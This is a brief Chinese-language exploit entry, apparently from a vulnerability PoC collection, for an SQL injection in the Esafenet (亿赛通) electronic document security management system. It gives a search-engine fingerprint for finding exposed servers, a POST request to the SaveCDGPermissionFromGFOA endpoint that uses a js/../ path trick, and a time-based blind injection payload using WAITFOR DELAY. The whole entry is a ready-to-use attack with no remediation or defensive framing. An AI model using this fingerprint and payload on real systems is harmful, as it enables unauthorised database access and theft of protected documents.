# 亿赛通电子文档安全管理系统SaveCDGPermissionFromGFOA存在SQL注入漏洞

亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1`

**Payload**
```
fileId=1';WAITFOR DELAY '0:0:2'--&pis=1
```